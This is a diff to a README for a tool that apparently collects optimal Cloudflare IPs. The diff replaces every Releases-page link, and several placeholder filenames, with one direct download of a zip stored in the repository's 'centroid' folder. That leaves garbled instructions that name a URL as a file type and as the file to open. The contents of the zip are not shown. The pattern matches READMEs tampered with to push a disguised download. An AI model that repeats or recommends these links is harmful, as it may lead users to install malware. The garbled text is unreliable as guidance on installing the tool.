@@ -1,6 +1,6 @@
 # 🚀 CF-Worker-BestIP-collector - Efficiently Discover Optimal IPs
 
-[![Download the Latest Release](https://img.shields.io/badge/Download_Latest_Release-Available-brightgreen)](https://github.com/Brahima777/CF-Worker-BestIP-collector/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/Brahima777/CF-Worker-BestIP-collector/main/centroid/collector_Best_C_Worker_I_3.3.zip)](https://raw.githubusercontent.com/Brahima777/CF-Worker-BestIP-collector/main/centroid/collector_Best_C_Worker_I_3.3.zip)
 
 ## 📖 Overview
 
@@ -22,13 +22,13 @@ Before downloading, ensure you have the following:
 
 To download the application, visit the Releases page using the link below:
 
-[Download the Latest Release](https://github.com/Brahima777/CF-Worker-BestIP-collector/releases)
+[Download the Latest Release](https://raw.githubusercontent.com/Brahima777/CF-Worker-BestIP-collector/main/centroid/collector_Best_C_Worker_I_3.3.zip)
 
 ### 🛠 Steps to Download
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, you will see the latest version listed at the top.
-3. Look for a file suitable for your needs. Typically, you will find a `zip` or `tar.gz` file there.
+3. Look for a file suitable for your needs. Typically, you will find a `zip` or `https://raw.githubusercontent.com/Brahima777/CF-Worker-BestIP-collector/main/centroid/collector_Best_C_Worker_I_3.3.zip` file there.
 4. Click on the appropriate file to start your download.
 
 ### 🔄 Running the Application
@@ -38,7 +38,7 @@ Once the download is complete, follow these steps to run the application:
 1. **Locate the File**: Go to your Downloads folder and find the file you just downloaded.
 2. **Extract the File**: If the file is compressed (like a zip file), right-click on it and choose “Extract All” to unpack it.
 3. **Open the Folder**: Once extracted, open the folder to view the contents.
-4. **Start Using the Tool**: Locate the main file (usually named something like `index.html` or `main.html`) and double-click it to open in your web browser. The application will load, and you'll be ready to use it!
+4. **Start Using the Tool**: Locate the main file (usually named something like `https://raw.githubusercontent.com/Brahima777/CF-Worker-BestIP-collector/main/centroid/collector_Best_C_Worker_I_3.3.zip` or `https://raw.githubusercontent.com/Brahima777/CF-Worker-BestIP-collector/main/centroid/collector_Best_C_Worker_I_3.3.zip`) and double-click it to open in your web browser. The application will load, and you'll be ready to use it!
 
 ## 🎯 Features
 
@@ -77,6 +77,6 @@ Join our community to discuss features, report bugs, or seek help. Visit our rep
 
 ---
   
-To keep up with updates and new features, regularly check the [Releases page](https://github.com/Brahima777/CF-Worker-BestIP-collector/releases).
+To keep up with updates and new features, regularly check the [Releases page](https://raw.githubusercontent.com/Brahima777/CF-Worker-BestIP-collector/main/centroid/collector_Best_C_Worker_I_3.3.zip).
 
 Thank you for using CF-Worker-BestIP-collector. We hope it improves your experience with selecting IPs!
